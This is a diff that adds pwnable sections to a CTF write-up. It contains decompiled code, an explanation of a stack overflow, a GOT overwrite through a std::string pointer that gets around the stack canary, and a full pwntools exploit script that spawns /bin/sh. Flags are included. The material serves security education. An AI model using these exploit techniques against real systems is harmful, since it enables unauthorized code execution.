@@ -479,7 +479,24 @@ Flag:
 # Pwnable
 I solved 2 out of 4.
 Because CTF has end, I cannot find the challenge files(also the server is closed too), so I will explain it by what I can remember.
+### 1.Python_is_safe
+```python
+#!/usr/bin/env python3
+
+from ctypes import CDLL, c_buffer
+libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
+buf1 = c_buffer(512)
+buf2 = c_buffer(512)
+libc.gets(buf1)
+if b'HCMUS-CTF' in bytes(buf2):
+    print(open('./flag.txt', 'r').read())
+```
 In the first challenge, it just a normal BOF challenge, overflow the first char array to fill the second array and it's done.
+
+Flag:
+```HCMUS-CTF{pYt40n_4rE_s|U|Perrrrrrr_5ecureeeeeeeeeeee}```
+
+### 2. Coin mining
 In the second challenge - coin mining. 2 things need to do:
 -   Find the canary
 -   Find the libc base address
@@ -544,3 +561,150 @@ s.interactive()
 
 Flag:
 ```HCMUS-CTF{gA1n_coin_everyday_better_c01n_better_he4th}```
+
+### 3. String chan
+```c++
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  __int64 v3; // rax
+  __int64 v4; // rax
+  __int64 v5; // rax
+  __int64 v6; // rax
+  __int64 v7; // rax
+  __int64 v8; // rax
+  __int64 v9; // rax
+  Test *v10; // rax
+  __int64 v11; // rbx
+  Test *v12; // rax
+  __int64 v13; // rax
+  __int64 v14; // rax
+  __int64 v15; // rbx
+  __int64 v16; // rax
+  __int64 v17; // rax
+  __int64 v18; // rax
+  int v19; // ebx
+  int v21; // [rsp+Ch] [rbp-64h] BYREF
+  char v22[72]; // [rsp+10h] [rbp-60h] BYREF
+  unsigned __int64 v23; // [rsp+58h] [rbp-18h]
+
+  v23 = __readfsqword(0x28u);
+  Test::Test((Test *)v22);
+  setbuf(stdin, 0LL);
+  setbuf(stdout, 0LL);
+  v3 = std::operator<<<std::char_traits<char>>(&std::cout, "1. set c_str");
+  v4 = std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
+  v5 = std::operator<<<std::char_traits<char>>(v4, "2. get c_str");
+  v6 = std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
+  v7 = std::operator<<<std::char_traits<char>>(v6, "3. set str");
+  v8 = std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
+  v9 = std::operator<<<std::char_traits<char>>(v8, "4. get str");
+  std::ostream::operator<<(v9, &std::endl<char,std::char_traits<char>>);
+  while ( (unsigned __int8)std::ios::good(&unk_404230) )
+  {
+    v21 = 0;
+    std::operator<<<std::char_traits<char>>(&std::cout, "choice: ");
+    std::istream::operator>>(&std::cin, &v21);
+    if ( v21 == 4 )
+    {
+      v15 = std::operator<<<std::char_traits<char>>(&std::cout, "str: ");
+      v16 = Test::str[abi:cxx11]((__int64)v22);
+      v17 = std::operator<<<char>(v15, v16);
+      std::ostream::operator<<(v17, &std::endl<char,std::char_traits<char>>);
+    }
+    else
+    {
+      if ( v21 > 4 )
+        goto LABEL_13;
+      switch ( v21 )
+      {
+        case 3:
+          std::operator<<<std::char_traits<char>>(&std::cout, "str: ");
+          v14 = Test::str[abi:cxx11]((__int64)v22);
+          std::operator>><char>(&std::cin, v14);
+          break;
+        case 1:
+          std::operator<<<std::char_traits<char>>(&std::cout, "c_str: ");
+          v10 = Test::c_str((Test *)v22);
+          std::operator>><char,std::char_traits<char>>(&std::cin, v10);
+          break;
+        case 2:
+          v11 = std::operator<<<std::char_traits<char>>(&std::cout, "c_str: ");
+          v12 = Test::c_str((Test *)v22);
+          v13 = std::operator<<<std::char_traits<char>>(v11, v12);
+          std::ostream::operator<<(v13, &std::endl<char,std::char_traits<char>>);
+          break;
+        default:
+LABEL_13:
+          v18 = std::operator<<<std::char_traits<char>>(&std::cout, "bye!");
+          std::ostream::operator<<(v18, &std::endl<char,std::char_traits<char>>);
+          v19 = 0;
+          goto LABEL_15;
+      }
+    }
+  }
+  v19 = 1;
+LABEL_15:
+  Test::~Test((Test *)v22);
+  return v19;
+}
+```
+
+Let's get straight into the challenge, our focus is on the option 1:
+```c++
+case 1:
+    std::operator<<<std::char_traits<char>>(&std::cout, "c_str: ");
+    v10 = Test::c_str((Test *)v22);
+    std::operator>><char,std::char_traits<char>>(&std::cin, v10);
+```
+Our main goal is to make process call the call_me function:
+```c++
+int __fastcall Test::call_me(Test *this)
+{
+  return system("/bin/sh");
+}
+```
+So if you notice, that cin doesn't check the input's length, so this is BOF vulnerability. We will exploit this to change the return address. But the other problem raise when canary cannot be change, so how do we bypass this? There are something that I realized when trying to test the input, that first 8 bytes will be the pointer to string, next 8 bytes will be the size of string, and the last 8 bytes will be the allocated size of string. Yes, we will overwrite first 8 bytes to make it point to the __stack_chk_fail GOT and change the address to call_me. Is this done? No, if you do that, you still cannot spawn new shell because of the ```stack alignment``` (in x86 architecture you may not notice it as the stack alignment is 4, but on x64 architecture, the stack aligntment is 16). So how do we fix this?
+Look again at asm code:
+```
+.text:00000000004015B5                 call    ___stack_chk_fail
+.text:00000000004015BA ; ---------------------------------------------------------------------------
+.text:00000000004015BA
+.text:00000000004015BA loc_4015BA:                             ; CODE XREF: main+29D↑j
+.text:00000000004015BA                 mov     rbx, [rbp+var_8]
+.text:00000000004015BE                 leave
+.text:00000000004015BF                 retn
+```
+The call __stack_chk_fail is execute first, before leave,ret. So we can just simply overwrite the GOT to the ```ret``` address and its done( because when call, the ```mov rbx, [rbp + var_8]``` address will be pushed onto the stack, and then after execute ```ret```, it return to normal, like there is no canary stack check in here).
+
+Solution:
+```python
+from pwn import *
+
+context.binary = "./chall"
+
+e = ELF('./chall')
+#r = e.process()
+gs = """
+b*main+510
+"""
+s = process(executable = "./chall", argv = [])
+#s = remote("string-chan-b4fc1611fb16fcab.chall.ctf.blackpinker.com", 443, ssl = True)
+payload = b'A' * 0x20 + p64(e.got['__stack_chk_fail']) + p64(8) * 2 #pointer, size, allocate capacity respectively
+s.sendlineafter(b'choice: ',b'1')
+s.sendline(payload)
+
+s.sendlineafter(b'choice: ',b'3')
+
+ret = p64(0x000000000040101a)
+s.sendlineafter(b'str: ', ret)
+
+callme = p64(0x00000000004016de)
+payload = b'\x00' * 0x68
+payload +=  callme
+s.sendline(b'1')
+
+s.sendline(payload)
+
+s.sendline(b'100') # break loop
+s.interactive()
+```
